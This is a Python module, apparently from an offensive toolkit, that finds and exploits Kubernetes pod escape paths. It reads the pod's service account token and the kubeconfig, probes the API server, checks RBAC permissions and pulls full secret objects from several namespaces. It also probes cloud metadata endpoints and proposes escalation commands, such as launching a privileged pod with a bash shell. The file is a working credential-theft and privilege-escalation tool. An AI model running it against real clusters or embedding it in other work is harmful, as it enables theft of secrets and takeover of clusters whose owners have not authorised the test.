"""
Kubernetes Escape Module (P3 — Container/Sandbox Escape)

Detects and exploits Kubernetes pod/service account escape vectors:
  - Service account token extraction
  - K8s API server discovery and access
  - RBAC permission analysis
  - Pod-to-cluster-admin escalation paths
  - Secrets extraction via API
  - Cloud provider metadata from pod perspective
  - Namespace discovery
  - Node access via privileged pods

FORGE Rule 3 (import map): stdlib only.
FORGE Rule 4 (subprocess): no subprocess calls — pure file I/O and HTTP.
"""

from __future__ import annotations

import os
import re
import json
import time
import logging
import urllib.request
import urllib.error
from enum import Enum
from dataclasses import dataclass, field, asdict
from typing import Any, Optional

logger = logging.getLogger(__name__)


class K8sResourceType(Enum):
    POD = "pods"
    SERVICE = "services"
    SECRET = "secrets"
    CONFIGMAP = "configmaps"
    NAMESPACE = "namespaces"
    NODE = "nodes"
    CLUSTER_ROLE = "clusterroles"
    CLUSTER_ROLE_BINDING = "clusterrolebindings"
    ROLE = "roles"
    ROLE_BINDING = "rolebindings"
    SERVICE_ACCOUNT = "serviceaccounts"
    DEPLOYMENT = "deployments"
    DAEMONSET = "daemonsets"
    STATEFULSET = "statefulsets"


class EscalationRisk(Enum):
    IMMEDIATE_ESCALATION = "immediate_escalation"
    HIGH_PRIVILEGE = "high_privilege"
    MODERATE = "moderate"
    LOW = "low"
    NONE = "none"


@dataclass
class ServiceAccountInfo:
    """Kubernetes service account information."""
    namespace: str = ""
    token_path: str = ""
    token_present: bool = False
    ca_cert_path: str = ""
    ca_cert_present: bool = False
    token: str = ""
    namespace_content: str = ""

    def to_dict(self) -> dict:
        return {
            "namespace": self.namespace,
            "token_path": self.token_path,
            "token_present": self.token_present,
            "ca_cert_present": self.ca_cert_present,
            "token_preview": self.token[:20] + "..." if self.token else "",
        }


@dataclass
class K8sAPIAccess:
    """Kubernetes API server access information."""
    api_url: str = ""
    accessible: bool = False
    api_version: str = ""
    authenticated: bool = False
    auth_method: str = ""  # token / cert / anonymous
    namespace: str = "default"
    pod_name: str = ""
    pod_namespace: str = ""
    error: str = ""

    def to_dict(self) -> dict:
        return {
            "api_url": self.api_url,
            "accessible": self.accessible,
            "api_version": self.api_version,
            "authenticated": self.authenticated,
            "auth_method": self.auth_method,
            "namespace": self.namespace,
            "pod_name": self.pod_name,
            "pod_namespace": self.pod_namespace,
        }


@dataclass
class RBACCheck:
    """RBAC permission check result."""
    resource: str
    verb: str
    allowed: bool
    namespace: str = ""
    description: str = ""

    def to_dict(self) -> dict:
        return {
            "resource": self.resource,
            "verb": self.verb,
            "allowed": self.allowed,
            "namespace": self.namespace,
            "description": self.description,
        }


@dataclass
class EscalationPath:
    """A detected Kubernetes escalation path."""
    technique: str
    description: str
    risk: EscalationRisk
    evidence: str = ""
    commands: list[str] = field(default_factory=list)
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "technique": self.technique,
            "description": self.description,
            "risk": self.risk.value,
            "evidence": self.evidence[:200],
            "commands": self.commands[:5],
        }


@dataclass
class K8sEscapeResult:
    """Result of K8s escape analysis."""
    service_account: ServiceAccountInfo = field(default_factory=ServiceAccountInfo)
    api_access: K8sAPIAccess = field(default_factory=K8sAPIAccess)
    rbac_checks: list[RBACCheck] = field(default_factory=list)
    high_value_resources: list[dict] = field(default_factory=list)
    secrets: list[dict] = field(default_factory=list)
    escalation_paths: list[EscalationPath] = field(default_factory=list)
    nodes_accessible: list[str] = field(default_factory=list)
    namespaces_found: list[str] = field(default_factory=list)
    cloud_metadata_access: bool = False
    summary: str = ""

    def to_dict(self) -> dict:
        return {
            "service_account": self.service_account.to_dict(),
            "api_access": self.api_access.to_dict(),
            "rbac_checks": [c.to_dict() for c in self.rbac_checks],
            "high_value_resources": self.high_value_resources[:10],
            "secrets_found": len(self.secrets),
            "secrets": [{"name": s.get("metadata", {}).get("name", "unknown"), "namespace": s.get("metadata", {}).get("namespace", "")} for s in self.secrets[:10]],
            "escalation_paths": [p.to_dict() for p in self.escalation_paths],
            "nodes_accessible": self.nodes_accessible[:10],
            "namespaces_found": self.namespaces_found,
            "cloud_metadata_access": self.cloud_metadata_access,
            "summary": self.summary,
        }


class K8sEscapeScanner:
    """Scans for Kubernetes pod/service account escape vectors.

    Discovers service account tokens, probes the K8s API server,
    checks RBAC permissions, and identifies privilege escalation paths.
    All via stdlib HTTP and file I/O.
    """

    # Default K8s service account paths
    SA_BASE_PATH = "/var/run/secrets/kubernetes.io/serviceaccount"

    # RBAC verbs to test
    RBAC_VERBS = ["get", "list", "watch", "create", "update", "patch", "delete"]

    # High-value resources to check
    HIGH_VALUE_RESOURCES = [
        "secrets", "configmaps", "pods", "nodes",
        "clusterroles", "clusterrolebindings",
        "roles", "rolebindings",
        "serviceaccounts", "deployments",
    ]

    def __init__(self, api_timeout: int = 5):
        self.api_timeout = api_timeout
        self._sa_token: str = ""
        self._api_url: str = ""
        self._ca_cert_path: str = ""

    def scan(self) -> K8sEscapeResult:
        """Full K8s escape scan."""
        result = K8sEscapeResult()

        # Step 1: Extract service account info
        result.service_account = self._extract_service_account()

        # Step 2: Discover and probe API server
        result.api_access = self._probe_api_server()

        # Step 3: Check RBAC permissions
        if result.api_access.authenticated:
            result.rbac_checks = self._check_rbac(result.api_access)

            # Step 4: List namespaces
            result.namespaces_found = self._list_namespaces(result.api_access)

            # Step 5: Find high-value resources
            result.high_value_resources = self._find_high_value_resources(result.api_access)

            # Step 6: Extract secrets
            result.secrets = self._extract_secrets(result.api_access)

            # Step 7: Check node access
            result.nodes_accessible = self._check_node_access(result.api_access)

            # Step 8: Identify escalation paths
            result.escalation_paths = self._identify_escalation_paths(
                result.api_access, result.rbac_checks, result.secrets
            )

        # Step 9: Check cloud metadata access
        result.cloud_metadata_access = self._check_cloud_metadata()

        # Build summary
        summary_parts = []
        if result.api_access.accessible:
            summary_parts.append("API accessible")
        if result.api_access.authenticated:
            summary_parts.append(f"Auth: {result.api_access.auth_method}")
        if result.secrets:
            summary_parts.append(f"{len(result.secrets)} secrets")
        if result.escalation_paths:
            critical = sum(1 for p in result.escalation_paths if p.risk == EscalationRisk.IMMEDIATE_ESCALATION)
            high = sum(1 for p in result.escalation_paths if p.risk == EscalationRisk.HIGH_PRIVILEGE)
            if critical:
                summary_parts.append(f"{critical} critical escalation paths")
            if high:
                summary_parts.append(f"{high} high-risk paths")
        if result.cloud_metadata_access:
            summary_parts.append("Cloud metadata accessible")
        if not summary_parts:
            summary_parts.append("No K8s escape vectors")

        result.summary = f"K8s escape scan: {' | '.join(summary_parts)}"
        return result

    def _extract_service_account(self) -> ServiceAccountInfo:
        """Extract service account token and info from pod filesystem."""
        info = ServiceAccountInfo()

        # Check standard SA path
        if os.path.exists(self.SA_BASE_PATH):
            info.token_path = os.path.join(self.SA_BASE_PATH, "token")
            info.ca_cert_path = os.path.join(self.SA_BASE_PATH, "ca.crt")

            # Read token
            try:
                with open(info.token_path, "r") as f:
                    info.token = f.read().strip()
                    info.token_present = bool(info.token)
                    self._sa_token = info.token
            except (FileNotFoundError, PermissionError, OSError):
                pass

            # Read namespace
            ns_path = os.path.join(self.SA_BASE_PATH, "namespace")
            try:
                with open(ns_path, "r") as f:
                    info.namespace = f.read().strip()
            except (FileNotFoundError, PermissionError, OSError):
                pass

            # Check CA cert
            try:
                if os.access(info.ca_cert_path, os.R_OK):
                    info.ca_cert_present = True
            except OSError:
                pass

        # Also check for kubectl config
        kube_config = os.path.expanduser("~/.kube/config")
        if os.path.exists(kube_config):
            try:
                with open(kube_config, "r") as f:
                    config_data = f.read()
                    # Extract token from kubeconfig if present
                    token_match = re.search(r"token:\s*(\S+)", config_data)
                    if token_match:
                        info.token = token_match.group(1)
                        info.token_present = True
                        self._sa_token = info.token
                    # Extract namespace
                    ns_match = re.search(r"namespace:\s*(\S+)", config_data)
                    if ns_match:
                        info.namespace = ns_match.group(1)
            except (FileNotFoundError, PermissionError, OSError):
                pass

        return info

    def _probe_api_server(self) -> K8sAPIAccess:
        """Discover and probe the K8s API server."""
        access = K8sAPIAccess()

        # Try multiple methods to discover the API server
        api_url = self._discover_api_url()
        if not api_url:
            access.error = "No API server discovered"
            return access

        access.api_url = api_url
        self._api_url = api_url

        # Try unauthenticated access first
        live, version = self._api_request("GET", api_url)
        if live:
            access.accessible = True
            access.api_version = version

        # Try token authentication
        if self._sa_token:
            auth_live, auth_data = self._api_request("GET", api_url, token=self._sa_token)
            if auth_live:
                access.accessible = True
                access.authenticated = True
                access.auth_method = "token"

                # Extract pod info from token
                access.namespace = self._get_current_namespace()
                access.pod_namespace = access.namespace

        # Try anonymous access
        if not access.authenticated and live:
            access.accessible = True
            access.auth_method = "anonymous"

        return access

    def _discover_api_url(self) -> str:
        """Discover K8s API server URL."""
        # Method 1: Environment variables
        host = os.environ.get("KUBERNETES_SERVICE_HOST")
        port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
        if host:
            return f"https://{host}:{port}"

        # Method 2: DNS lookup
        try:
            import socket as _socket
            _socket.getaddrinfo("kubernetes.default.svc", 443)
            return "https://kubernetes.default.svc:443"
        except Exception:
            pass

        # Method 3: kubeconfig
        kube_config = os.path.expanduser("~/.kube/config")
        if os.path.exists(kube_config):
            try:
                with open(kube_config, "r") as f:
                    for line in f:
                        match = re.search(r"server:\s*(\S+)", line)
                        if match:
                            return match.group(1)
            except (FileNotFoundError, PermissionError, OSError):
                pass

        return ""

    def _api_request(self, method: str, url: str, path: str = "",
                     token: str = "", timeout: int = 0) -> tuple[bool, Any]:
        """Make a request to the K8s API server."""
        full_url = f"{url.rstrip('/')}{path}"
        headers = {
            "User-Agent": "Raphael/1.0",
            "Accept": "application/json",
        }

        if token:
            headers["Authorization"] = f"Bearer {token}"

        t = timeout or self.api_timeout

        try:
            req = urllib.request.Request(full_url, method=method, headers=headers)
            ctx = self._create_ssl_context()
            with urllib.request.urlopen(req, timeout=t, context=ctx) as resp:
                data = resp.read()
                if resp.status == 200:
                    try:
                        return True, json.loads(data)
                    except json.JSONDecodeError:
                        return True, data.decode("utf-8", errors="replace")[:500]
                return resp.status == 200, {}
        except urllib.error.HTTPError as e:
            if e.code == 401:
                return True, {"authenticated": False}
            if e.code == 403:
                return True, {"authorized": False}
            return False, {}
        except Exception:
            return False, {}

    def _create_ssl_context(self):
        """Create SSL context that accepts self-signed K8s certs."""
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        # Try to use the CA cert if available
        if self._ca_cert_path and os.path.exists(self._ca_cert_path):
            try:
                ctx.load_verify_locations(self._ca_cert_path)
                ctx.verify_mode = ssl.CERT_REQUIRED
                ctx.check_hostname = True
            except Exception:
                pass

        return ctx

    def _get_current_namespace(self) -> str:
        """Get current namespace."""
        ns_path = os.path.join(self.SA_BASE_PATH, "namespace")
        try:
            with open(ns_path, "r") as f:
                return f.read().strip()
        except Exception:
            return "default"

    def _check_rbac(self, access: K8sAPIAccess) -> list[RBACCheck]:
        """Check RBAC permissions via self-subject-access-reviews."""
        checks = []

        # Use SelfSubjectAccessReview API to check permissions
        for resource in self.HIGH_VALUE_RESOURCES:
            for verb in self.RBAC_VERBS[:3]:  # Test get, list, create
                allowed = self._check_self_access(access, resource, verb)
                if allowed:
                    checks.append(RBACCheck(
                        resource=resource,
                        verb=verb,
                        allowed=True,
                        namespace=access.namespace,
                        description=f"Can {verb} {resource} in namespace {access.namespace}",
                    ))

        # Check cluster-scope access
        for resource in ["nodes", "clusterroles", "clusterrolebindings"]:
            for verb in ["get", "list"]:
                allowed = self._check_self_access(access, resource, verb, cluster_scope=True)
                if allowed:
                    checks.append(RBACCheck(
                        resource=resource,
                        verb=verb,
                        allowed=True,
                        description=f"Can {verb} {resource} at cluster scope",
                    ))

        return checks

    def _check_self_access(self, access: K8sAPIAccess, resource: str,
                           verb: str, cluster_scope: bool = False) -> bool:
        """Check if the current service account can access a resource."""
        try:
            if cluster_scope:
                body = {
                    "apiVersion": "v1",
                    "kind": "SelfSubjectAccessReview",
                    "spec": {
                        "resourceAttributes": {
                            "verb": verb,
                            "resource": resource,
                        }
                    }
                }
            else:
                body = {
                    "apiVersion": "v1",
                    "kind": "SelfSubjectAccessReview",
                    "spec": {
                        "resourceAttributes": {
                            "namespace": access.namespace,
                            "verb": verb,
                            "resource": resource,
                        }
                    }
                }

            req_body = json.dumps(body).encode("utf-8")
            full_url = f"{access.api_url.rstrip('/')}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"
            headers = {
                "User-Agent": "Raphael/1.0",
                "Authorization": f"Bearer {self._sa_token}",
                "Content-Type": "application/json",
                "Accept": "application/json",
            }

            ctx = self._create_ssl_context()
            req = urllib.request.Request(full_url, data=req_body, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=self.api_timeout, context=ctx) as resp:
                data = json.loads(resp.read())
                status = data.get("status", {})
                return status.get("allowed", False)
        except Exception:
            return False

    def _list_namespaces(self, access: K8sAPIAccess) -> list[str]:
        """List available namespaces."""
        try:
            success, data = self._api_request("GET", access.api_url, "/api/v1/namespaces",
                                              token=self._sa_token)
            if success and isinstance(data, dict):
                items = data.get("items", [])
                return [ns.get("metadata", {}).get("name", "") for ns in items if ns.get("metadata")]
        except Exception:
            pass
        return []

    def _find_high_value_resources(self, access: K8sAPIAccess) -> list[dict]:
        """Find high-value resources accessible to the pod."""
        resources = []

        # Check secrets across all accessible namespaces
        namespaces = self._list_namespaces(access) or [access.namespace]

        for ns in namespaces[:5]:  # Limit to 5 namespaces
            for resource_type in ["secrets", "configmaps", "pods"]:
                try:
                    success, data = self._api_request(
                        "GET", access.api_url,
                        f"/api/v1/namespaces/{ns}/{resource_type}",
                        token=self._sa_token
                    )
                    if success and isinstance(data, dict):
                        items = data.get("items", [])
                        for item in items:
                            resource = {
                                "type": resource_type,
                                "name": item.get("metadata", {}).get("name", ""),
                                "namespace": ns,
                            }
                            resources.append(resource)
                except Exception:
                    continue

        # Check cluster-scope resources
        for resource_type in ["nodes", "clusterroles", "clusterrolebindings"]:
            try:
                success, data = self._api_request(
                    "GET", access.api_url,
                    f"/api/v1/{resource_type}" if resource_type == "nodes" else f"/apis/rbac.authorization.k8s.io/v1/{resource_type}",
                    token=self._sa_token
                )
                if success and isinstance(data, dict):
                    items = data.get("items", [])
                    for item in items:
                        resources.append({
                            "type": resource_type,
                            "name": item.get("metadata", {}).get("name", ""),
                            "namespace": "cluster",
                        })
            except Exception:
                continue

        return resources

    def _extract_secrets(self, access: K8sAPIAccess) -> list[dict]:
        """Extract secrets from accessible namespaces."""
        secrets = []
        namespaces = self._list_namespaces(access) or [access.namespace]

        for ns in namespaces[:5]:
            try:
                success, data = self._api_request(
                    "GET", access.api_url,
                    f"/api/v1/namespaces/{ns}/secrets",
                    token=self._sa_token
                )
                if success and isinstance(data, dict):
                    items = data.get("items", [])
                    for item in items:
                        secrets.append(item)
            except Exception:
                continue

        return secrets

    def _check_node_access(self, access: K8sAPIAccess) -> list[str]:
        """Check if nodes are accessible."""
        nodes = []
        try:
            success, data = self._api_request(
                "GET", access.api_url, "/api/v1/nodes",
                token=self._sa_token
            )
            if success and isinstance(data, dict):
                items = data.get("items", [])
                for item in items:
                    node_name = item.get("metadata", {}).get("name", "")
                    if node_name:
                        nodes.append(node_name)
        except Exception:
            pass
        return nodes

    def _identify_escalation_paths(self, access: K8sAPIAccess, rbac_checks: list[RBACCheck],
                                    secrets: list[dict]) -> list[EscalationPath]:
        """Identify Kubernetes privilege escalation paths."""
        paths = []

        # Track what permissions we have
        can_get_secrets = any(c.resource == "secrets" and c.verb == "get" and c.allowed for c in rbac_checks)
        can_list_secrets = any(c.resource == "secrets" and c.verb == "list" and c.allowed for c in rbac_checks)
        can_get_pods = any(c.resource == "pods" and c.verb == "get" and c.allowed for c in rbac_checks)
        can_list_pods = any(c.resource == "pods" and c.verb == "list" and c.allowed for c in rbac_checks)
        can_create_pods = any(c.resource == "pods" and c.verb == "create" and c.allowed for c in rbac_checks)
        can_list_nodes = any(c.resource == "nodes" and c.verb == "list" and c.allowed for c in rbac_checks)
        can_list_cluster_roles = any(c.resource == "clusterroles" and c.verb == "list" and c.allowed for c in rbac_checks)
        can_list_cluster_role_bindings = any(c.resource == "clusterrolebindings" and c.verb == "list" and c.allowed for c in rbac_checks)

        # Path 1: Secrets extraction -> service account tokens
        if can_list_secrets or can_get_secrets:
            # Found secrets that might contain service account tokens
            sa_secrets = [s for s in secrets if s.get("type") == "kubernetes.io/service-account-token"]
            if sa_secrets:
                paths.append(EscalationPath(
                    technique="service_account_token_in_secrets",
                    description=f"Service account tokens found in secrets ({len(sa_secrets)} secrets) — can impersonate",
                    risk=EscalationRisk.IMMEDIATE_ESCALATION,
                    evidence=f"Found {len(sa_secrets)} service account tokens in secrets",
                    commands=["kubectl get secrets -o json | jq '.items[] | select(.type==\"kubernetes.io/service-account-token\")'"],
                    details={"secret_count": len(sa_secrets)},
                ))

        # Path 2: Pod creation in privileged namespace
        if can_create_pods:
            paths.append(EscalationPath(
                technique="pod_creation_privileged_escalation",
                description="Can create pods — possible hostPath mount or privileged container escape",
                risk=EscalationRisk.IMMEDIATE_ESCALATION,
                evidence="SelfSubjectAccessReview shows create pods is allowed",
                commands=["kubectl run escape --image=ubuntu --privileged -- /bin/bash"],
                details={"verb": "create", "resource": "pods"},
            ))

        # Path 3: Node access
        if can_list_nodes:
            paths.append(EscalationPath(
                technique="node_enumeration",
                description=f"Can list nodes ({len(self._check_node_access(access))} nodes) — enables targeted operations",
                risk=EscalationRisk.HIGH_PRIVILEGE,
                evidence="SelfSubjectAccessReview shows list nodes is allowed",
                commands=["kubectl get nodes -o wide"],
            ))

        # Path 4: Cluster role binding access
        if can_list_cluster_roles or can_list_cluster_role_bindings:
            paths.append(EscalationPath(
                technique="cluster_role_enumeration",
                description="Can list cluster roles/bindings — can find bindings to escalate",
                risk=EscalationRisk.HIGH_PRIVILEGE,
                evidence="SelfSubjectAccessReview shows list cluster roles/bindings is allowed",
                commands=["kubectl get clusterroles -o json | jq '.items[] | select(.rules[].resources[] | contains(\"*\"))'"],
            ))

        # Path 5: Pod list -> extract service accounts from running pods
        if can_list_pods:
            paths.append(EscalationPath(
                technique="pod_service_account_extraction",
                description="Can list pods — can find pods with privileged service accounts",
                risk=EscalationRisk.MODERATE,
                evidence="SelfSubjectAccessReview shows list pods is allowed",
                commands=["kubectl get pods -o json | jq '.items[].spec.serviceAccountName'"],
            ))

        # Path 6: Anonymous API access
        if access.authenticated is False and access.accessible:
            paths.append(EscalationPath(
                technique="anonymous_api_access",
                description="K8s API accessible without authentication — misconfigured RBAC",
                risk=EscalationRisk.HIGH_PRIVILEGE,
                evidence=f"API server at {access.api_url} responds without authentication",
                commands=[f"curl -k {access.api_url}/api/v1/secrets"],
            ))

        return paths

    def _check_cloud_metadata(self) -> bool:
        """Check if cloud metadata service is accessible from the pod."""
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://169.254.169.254/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
            "http://100.100.100.200/latest/meta-data/",  # Alibaba
        ]

        for url in metadata_urls:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Raphael/1.0", "Metadata": "true"})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    if resp.status == 200:
                        return True
            except Exception:
                continue

        return False


def scan_k8s_escape() -> dict:
    """Convenience function to scan for K8s escapes."""
    scanner = K8sEscapeScanner()
    result = scanner.scan()
    return result.to_dict()


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
    result = scan_k8s_escape()
    print(json.dumps(result, indent=2, default=str))
